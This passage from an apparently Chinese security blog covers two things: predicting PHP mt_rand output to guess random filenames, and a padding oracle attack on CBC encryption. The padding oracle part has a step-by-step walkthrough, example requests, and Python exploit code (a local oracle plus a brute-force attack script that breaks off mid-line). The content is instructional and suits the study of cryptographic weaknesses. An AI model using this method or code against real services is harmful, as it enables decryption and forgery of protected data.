keyword">echo</span> <span class="token function">mt_rand</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./php mt_rand.php<span class="token number">1608834717</span><span class="token number">364052752</span><span class="token number">104617820</span><span class="token number">1855329673</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4）预测文件名"><a href="#4）预测文件名" class="headerlink" title="4）预测文件名"></a>4）预测文件名</h4><p>预测出随机数序列之后，便可以预测出随机文件名的每一位，从而最终获得文件名。</p><p>最终可以绕过随机文件名防护，实现文件包含等漏洞的利用。</p><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>伪随机数生成的安全性对许多应用至关重要，尤其是在密码学领域。为了确保伪随机数的安全性，必须考虑以下几个方面：</p><ol><li><strong>使用加密安全的伪随机数生成器（CSPRNG）</strong>。</li><li><strong>增加种子熵</strong>，避免使用低熵或固定种子。</li><li><strong>定期更新内部状态</strong>，避免周期性输出和回溯攻击。</li><li><strong>选择高质量的算法</strong>，避免使用简单、过时的PRNG。</li></ol><p>在高安全性场景下，建议结合<strong>硬件随机数生成器</strong>和<strong>加密安全算法</strong>，以提供更强的随机性和安全性。</p>]]></content>
      
      
      <categories>
          
          <category> 密码学算法安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学算法安全 </tag>
            
            <tag> 随机数安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>padding oracle攻击</title>
      <link href="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/"/>
      <url>/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="一、CBC模式简介"><a href="#一、CBC模式简介" class="headerlink" title="一、CBC模式简介"></a>一、CBC模式简介</h1><p>CBC（Cipher Block Chaining，密码块链模式）是一种分组密码的加密模式，它通过将每个明文块与前一个密文块进行异或操作后再加密，以确保数据的安全性。</p><h2 id="1-1-CBC加密流程"><a href="#1-1-CBC加密流程" class="headerlink" title="1.1 CBC加密流程"></a>1.1 CBC加密流程</h2><p>在CBC模式中，首先对明文进行分组，每个明文块先与前一个密文块进行异或后，再进行加密。CBC模式下，每个密文块依赖于前面的所有的明文块。</p><p>涉及到的概念：</p><ol><li><strong>初始化向量（IV）</strong>：CBC模式使用一个初始化向量（IV），这是一个随机生成的值，与第一个明文块进行异或操作。IV的作用是为加密过程提供一个随机的起点，确保相同的明文块在不同的加密过程中产生不同的密文块。</li></ol><h3 id="1-1-1-加密流程"><a href="#1-1-1-加密流程" class="headerlink" title="1.1.1 加密流程"></a>1.1.1 加密流程</h3><p>其加密流程示意图如下：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.00.05.png" alt="CBC模式加密流程" style="zoom:50%;"><ul><li>将明文分为固定大小的块（通常是8字节或16字节）。</li><li>第一个明文块与IV进行异或操作。</li><li>异或后的结果通过加密算法（如AES）加密，生成第一个密文块。</li><li>每个后续的明文块都与前一个密文块进行异或操作，然后再加密，生成下一个密文块。</li></ul><p>密文分组3受到明文分组1、明文分组2、明文分组3的共同影响。</p><h3 id="1-1-2-解密流程"><a href="#1-1-2-解密流程" class="headerlink" title="1.1.2 解密流程"></a>1.1.2 解密流程</h3><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.01.51.png" alt="CBC模式解密流程" style="zoom:50%;"><ul><li>将密文分为相同的块大小。</li><li>第一个密文块通过解密算法解密，然后与IV进行异或操作，恢复出第一个明文块。</li><li>每个后续的密文块都先解密，然后与前一个密文块进行异或操作，恢复出原始的明文块。</li></ul><p>与加密过程不同的是名文分组3仅受密文分组2和密文分组3的共同影响。</p><h3 id="1-1-3-填充（Padding）"><a href="#1-1-3-填充（Padding）" class="headerlink" title="1.1.3 填充（Padding）"></a>1.1.3 填充（Padding）</h3><p>分组带来一个问题，就是明文不可能恰好是block的整数倍，对于不能整除剩余的部分数据就涉及到填充操作。</p><p>在加密最后一个不完整的明文块时，需要进行填充以确保块的大小符合加密算法的要求。常见的填充方式有PKCS#5和OneAndZeroes。</p><h4 id="1）PKCS-5："><a href="#1）PKCS-5：" class="headerlink" title="1）PKCS#5："></a>1）PKCS#5：</h4><p>在最后一个block中将不足的Byte数作为Byte值进行填充，缺少n个Byte，就填充n个0x0n，例如最后一个分组（block）缺少3个byte，就填充3个0x03到结尾。在解密时会校验明文的填充是否满足该规则，如果是以N个0x0N结束，则意味着解密操作执行成功，否则解密操作失败。</p><h4 id="2）OneAndZeroes："><a href="#2）OneAndZeroes：" class="headerlink" title="2）OneAndZeroes："></a>2）OneAndZeroes：</h4><p>在最后一个Block中将不足的byte位数以 0x80开头后续全填0x00的方式进行填充，若最后一个Block缺少3byte，则填充：0x80 0x00 0x00。</p><h1 id="二、Padding-Oracle攻击原理"><a href="#二、Padding-Oracle攻击原理" class="headerlink" title="二、Padding Oracle攻击原理"></a>二、Padding Oracle攻击原理</h1><p>这种攻击方式在2011年的Pwnie Rewards中被评为“最具有价值的服务器漏洞”，因为它能够绕过对算法的直接破解，通过旁路攻击的方式被利用。</p><p>核心原理：明文分组和填充，同时应用程序对于填充异常的响应可以作为反馈。</p><h2 id="2-1-利用场景"><a href="#2-1-利用场景" class="headerlink" title="2.1 利用场景"></a>2.1 利用场景</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://www.example.com/decrypt.jsp?data<span class="token operator">=</span>0000000000000000EFC2807233F9D7C097116BB33E813C5E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当攻击者在篡改data值时会有以下不同的响应：</p><ul><li>如果data值没有被篡改，则解密成功，并且业务校验成功，响应200</li><li>如果data值被篡改，服务端无法完成解密，解密校验失败，则响应500</li><li>如果data值被篡改，但是服务端解密成功，但业务逻辑校验失败，则可能返回200或302等响应码,而不是响应500</li></ul><p>攻击者只需关注解密成功和解密失败的响应即可（第三种属于解密成功的响应），即可完成攻击。</p><h2 id="2-2-破解密文"><a href="#2-2-破解密文" class="headerlink" title="2.2 破解密文"></a>2.2 破解密文</h2><h3 id="2-2-1-核心思路"><a href="#2-2-1-核心思路" class="headerlink" title="2.2.1 核心思路"></a>2.2.1 核心思路</h3><p>攻击者通过修改密文并发送给服务器，观察服务器对不同密文的响应。如果密文的填充正确，服务器会返回一个成功的响应；如果填充不正确，服务器会返回一个错误响应。攻击者利用这种差异性来确定密文的正确填充，从而逐步解密密文或构造出任意明文的合法密文。</p><h3 id="2-2-2-攻击过程"><a href="#2-2-2-攻击过程" class="headerlink" title="2.2.2 攻击过程"></a>2.2.2 攻击过程</h3><p>假设有这样一个应用，请求如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://www.example.com/decrypt.jsp?data<span class="token operator">=</span>7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即client给server提交的参数为<code>7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6</code> 才能请求正常的服务.</p><h4 id="1）内在加解密过程（不为攻击者所知晓）"><a href="#1）内在加解密过程（不为攻击者所知晓）" class="headerlink" title="1）内在加解密过程（不为攻击者所知晓）"></a>1）内在加解密过程（不为攻击者所知晓）</h4><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.03.19.png" alt="IV+密文值" style="zoom:80%;"><p>IV添加在密文的前段，即最前面8个字节。</p><ul><li>加密过程</li></ul><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.26.09.png" alt="加密过程" style="zoom:80%;"><ul><li>解密过程</li></ul><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.27.56.png" alt="解密过程" style="zoom:80%;"><p>值得注意的是，解密之后的最后一个数据块，其结尾应该包含正确的填充序列，如果不满足，加解密程序会返回异常（500）。</p><h4 id="2）攻击者视角破解密文"><a href="#2）攻击者视角破解密文" class="headerlink" title="2）攻击者视角破解密文"></a>2）攻击者视角破解密文</h4><ul><li>IV值置空</li></ul><p>取第一个Block的密文，并将初始化向量置为0，即：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> F8 <span class="token number">51</span> D6 CC <span class="token number">68</span> FC <span class="token number">95</span> <span class="token number">37</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这时的请求和响应：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Request: http://sampleapp/home.jsp?<span class="token environment constant">UID</span><span class="token operator">=</span>0000000000000000F851D6CC68FC9537Response: <span class="token number">500</span> - Internal Server Error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>回复500说明填充异常，原因是它的结尾未包含正确的填充字节：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.32.04.png" alt="0000000000000000F851D6CC68FC9537解密失败" style="zoom:80%;"><p>如上图所示，在解密之后，数据块的末尾并没有包含正确的填充序列，因此出现了异常。</p><ul><li>接下来尝试爆破，使得最后的填充序列满足<code>n个0xn</code>的条件</li></ul><p>我们将IV加1，并且发送同样密文</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Request: http://sampleapp/home.jsp?<span class="token environment constant">UID</span><span class="token operator">=</span>0000000000000001F851D6CC68FC9537Response: <span class="token number">500</span> - Internal Server Error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.34.03.png" alt="0000000000000001F851D6CC68FC9537解密失败" style="zoom:80%;"><p>重复发送这样的请求，每次将IV的最后一个字节加一（直至<code>0xFF</code>），那么最终我们将会产生一个合法的单字节填充序列（<code>0x01</code>）</p><p>对于可能的256个值中，只有一个值会产生正确的填充字节<code>0x01</code>，遇上这个值的时候，会得到一个不同于其他255个请求的回复结果。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Request: http://sampleapp/home.jsp?<span class="token environment constant">UID</span><span class="token operator">=</span>000000000000003CF851D6CC68FC9537Response: <span class="token number">200</span> OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.36.05.png" alt="000000000000003CF851D6CC68FC9537解密成功" style="zoom:80%;"><ul><li>推断出中间值（Intermediary Value）的最后一个字节（注意中间值攻击者不知道，他是攻击者攻击的目标）</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Intermediary Byte 异或 <span class="token number">0</span>×3C <span class="token operator">==</span> <span class="token number">0</span>×01, Intermediary Byte <span class="token operator">==</span> <span class="token number">0</span>×3C ^ <span class="token number">0</span>×01, Intermediary Byte <span class="token operator">==</span> <span class="token number">0</span>×3D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>重点：第一组密文解密的中间值是一直不变的，同样也是正确的，我们通过构造IV值，使得最后一位填充值满足0x01，符合padding规则，则意味着程序解密成功（当然解密的结果肯定不是原来的明文），通过循环测试的方法，猜解出中间值的最后一位，再利用同样的方式猜解前面的中间值，直到获取到完整的中间值。</p><ul><li>推断出中间值的倒数第二个字节。</li></ul><p>构造填充值为<code>0x02 0x02</code>的场景，即存在2个填充字节，填充值为<code>0x02</code>。</p><p>此时我们已经知道了中间值得最后一位为<code>0x3D</code>,计算出初始向量的最后一位：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x3D xor 0x02 <span class="token operator">=</span> 0x3F<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即初始向量为<code>0000000000000003F</code></p><p>遍历倒数第二个字节从<code>0x00~0xFF</code>，直到响应成功.</p><p>猜解出中间值得后两个字节分别为 <code>0x26 0x3D</code></p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.45.22.png" alt="破解出中间值的倒数第二个字节" style="zoom:80%;"><ul><li>推断出整个中间值</li></ul><p>运用这种技巧，我们可以最终得到解密后的中间值，也就是当整个数据块的填充值都是<code>0x08</code></p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.46.30.png" alt="中间值完整推断" style="zoom:80%;"><ul><li>明文破解</li></ul><p>当第一组密文的中间值猜解成功后，我们将中间值和已知的IV做异或，则得到第一组密文的明文：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x39 0x73 0x23 0x22 0x07 0x6A 0x26 0x3D  异或  0x7B 0x21 0x6A 0x63 0x49 0x51 0x17 0x0F<span class="token operator">=</span> BRIAN<span class="token punctuation">;</span><span class="token number">12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>续破解第二组密文，第二组密文的IV向量是第一组密文，按照上述的逻辑构造第一组密文，即可破解出第二组明文。</p><h3 id="2-2-3-思路总结"><a href="#2-2-3-思路总结" class="headerlink" title="2.2.3 思路总结"></a>2.2.3 思路总结</h3><ul><li>将IV最后一个字节设置为0x1，不断调整IV最后一个字节（0x01-0xff），爆破使得填充规则正确(7byte+0x01)，得到中间值的最后一个字节。</li><li>在得到最后一个字节的中间值后，将IV最后一个字节设置为0x02，计算IV的最后一个字节。</li><li>不断调整IV倒数第二个字节（0x01-0xff），爆破使得填充规则正确（6byte+0x02+0x02），得到倒数第二个字节的中间值。</li><li>依次类推获得整个中间值。</li><li>中间值和IV异或获得明文。</li></ul><h2 id="2-3伪造明文"><a href="#2-3伪造明文" class="headerlink" title="2.3伪造明文"></a>2.3伪造明文</h2><p>通过密文的破解过程，我们已经掌握了中间值（中间值同密文块是绑定的）和IV。</p><p>结合解密的流程，我们可以通过操纵IV来控制（密文块）解密得到的结果。</p><p>如果想要将密文中第一个数据块解密为“TEST”这个值，您可以计算出它所需要的IV值，只要将目标明文与中间值进行异或操作即可</p><p>只要将字符串”TEST”和4个<code>0x04</code>填充字节与中间值异或之后，便可以得到最终的IV，即<code>0×6D，0×36，0×70，0×76，0×03，0×6E，0×22，0×39</code></p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.52.22.png" alt="伪造明文示例" style="zoom:80%;"><p>如何生成长度超过一个数据块的明文，比如要生成”ENCRYPT TEST”</p><p>首先还是将文本拆成数据块，并设置填充字节</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.54.01.png" alt="伪造大于一个块的明文长度" style="zoom:60%;"><p>通过类似的步骤我们可以知道生成TEST0x040x040x040x04的中间值(0xc3 0x60 0xed 0xc9 0x 6d 0xf9 0x90 0x32)和IV1(也就是BLOCK1对应的密文)。</p><p>接下来，我们需要弄明白中间值IV1在作为密文是如何解密的。</p><p>只要使用与之前破解过程相同的技巧就行了，我们把它作为密文传递给应用程序，并从全部为NULL的IV开始进行暴力破解。的到IV1对应的中间值IV1_IM。</p><p>通过IV1_IM可以构造BLOCK1的明文为ENCRYPT%20，然后计算得到初始IV值。 </p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2011.06.12.png" style="zoom:80%;"><h1 id="三、exp"><a href="#三、exp" class="headerlink" title="三、exp"></a>三、exp</h1><h2 id="3-1-poa-py"><a href="#3-1-poa-py" class="headerlink" title="3.1 poa.py"></a>3.1 poa.py</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">from</span> hexdump <span class="token keyword">import</span> hexdump<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> IPythonplain <span class="token operator">=</span> <span class="token string">b"Hello World! MTDP! RedTeam! 23333"</span><span class="token keyword">class</span> <span class="token class-name">POA</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    KEY <span class="token operator">=</span> <span class="token string">b"1234567890abcdef"</span>    IV <span class="token operator">=</span> <span class="token string">b"0102030405060708"</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">__pad</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> text<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""PKCS7 padding"""</span>        text_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>        amount_to_pad <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size <span class="token operator">-</span> <span class="token punctuation">(</span>text_length <span class="token operator">%</span> AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span>        <span class="token keyword">if</span> amount_to_pad <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            amount_to_pad <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size        pad <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>amount_to_pad<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> text <span class="token operator">+</span> pad <span class="token operator">*</span> amount_to_pad    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">__unpad</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> text<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pad <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        _pad <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token operator">-</span>pad<span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> _pad<span class="token punctuation">:</span>            <span class="token keyword">if</span> pad <span class="token operator">!=</span> i<span class="token punctuation">:</span>                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Error Padding! - %s"</span> <span class="token operator">%</span> _pad<span class="token punctuation">)</span>        <span class="token keyword">return</span> text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span>pad<span class="token punctuation">]</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> plain<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pad_plain <span class="token operator">=</span> cls<span class="token punctuation">.</span>__pad<span class="token punctuation">(</span>plain<span class="token punctuation">)</span>        aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>mode<span class="token operator">=</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> key<span class="token operator">=</span>cls<span class="token punctuation">.</span>KEY<span class="token punctuation">,</span> iv<span class="token operator">=</span>cls<span class="token punctuation">.</span>IV<span class="token punctuation">)</span>        cipher <span class="token operator">=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad_plain<span class="token punctuation">)</span>        hexdump<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>        <span class="token keyword">return</span> cipher    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> cipher<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>mode<span class="token operator">=</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> key<span class="token operator">=</span>cls<span class="token punctuation">.</span>KEY<span class="token punctuation">,</span> iv<span class="token operator">=</span>cls<span class="token punctuation">.</span>IV<span class="token punctuation">)</span>        pad_plain <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>        <span class="token keyword">return</span> cls<span class="token punctuation">.</span>__unpad<span class="token punctuation">(</span>pad_plain<span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">decrypt_without_result</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> cipher<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            cls<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token comment"># print(e)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> POA<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    cipher <span class="token operator">=</span> test<span class="token punctuation">(</span><span class="token punctuation">)</span>    plain <span class="token operator">=</span> POA<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span>    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-poa-attack-py"><a href="#3-2-poa-attack-py" class="headerlink" title="3.2 poa_attack.py"></a>3.2 poa_attack.py</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> pdb<span class="token keyword">from</span> poa <span class="token keyword">import</span> test<span class="token punctuation">,</span> POA<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> IPython<span class="token keyword">class</span> <span class="token class-name">PaddingOracleAttack</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cipher<span class="token punctuation">,</span> iv<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>cipher <span class="token operator">=</span> cipher        <span class="token comment"># 把密文分割成列表，每个列表元素16字节</span>        self<span class="token punctuation">.</span>cipher_lst <span class="token operator">=</span> self<span class="token punctuation">.</span>split_block<span class="token punctuation">(</span>self<span class="token punctuation">.</span>cipher<span class="token punctuation">)</span>        <span class="token comment"># 解密的中间值</span>        self<span class="token punctuation">.</span>mid_lst <span class="token operator">=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>brute_middle<span class="token punctuation">(</span>self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment"># 存储计算出来的明文</span>        self<span class="token punctuation">.</span>plain_lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> self<span class="token punctuation">.</span>cipher_lst<span class="token punctuation">]</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">split_block</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>        cipher_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            cipher_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">:</span> i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> cipher_list    <span class="token keyword">def</span> <span class="token function">calc_new_tail</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> tail<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_tail <span class="token operator">=</span> <span class="token string">b""</span>        <span class="token keyword">for</span> t <span class="token keyword">in</span> tail<span class="token punctuation">:</span>            _tail <span class="token operator">=</span> t <span class="token operator">^</span> <span class="token punctuation">(</span>idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> idx            new_tail <span class="token operator">+=</span> _tail<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"big"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> new_tail    <span class="token keyword">def</span> <span class="token function">brute_middle</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cipher_line<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''暴力破解解密的中间值'''</span>        tail <span class="token operator">=</span> <span class="token string">b""</span>        mid_lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># 从pad 为0x01开始 到 0x10</span>        <span class="token keyword">for</span> pad <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 计算新的pad尾部，因为每计算出来一个pad，再往前计算新的pad的时候，尾部的每一个值异或出来都要放大1位。</span>            tail <span class="token operator">=</span> self<span class="token punctuation">.</span>calc_new_tail<span class="token punctuation">(</span>tail<span class="token punctuation">,</span> pad<span class="token punctuation">)</span>            find_pad <span class="token operator">=</span> <span class="token boolean">False</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment"># 形成2个密文块</span>                cipher <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">-</span> pad<span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token operator">+</span> tail <span class="token operator">+</span> cipher_line                <span class="token keyword">if</span> POA<span class="token punctuation">.</span>decrypt_without_result<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment"># print("[!] Cipher - %s" % cipher)</span>                    find_pad <span class="token operator">=</span> <span class="token boolean">True</span>                    tail <span class="token operator">=</span> i<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token operator">+</span> tail                    mid_chr <span class="token operator">=</span> i <span class="token operator">^</span> pad                    mid_lst<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> mid_chr<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> find_pad<span class="token punctuation">:</span>                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token 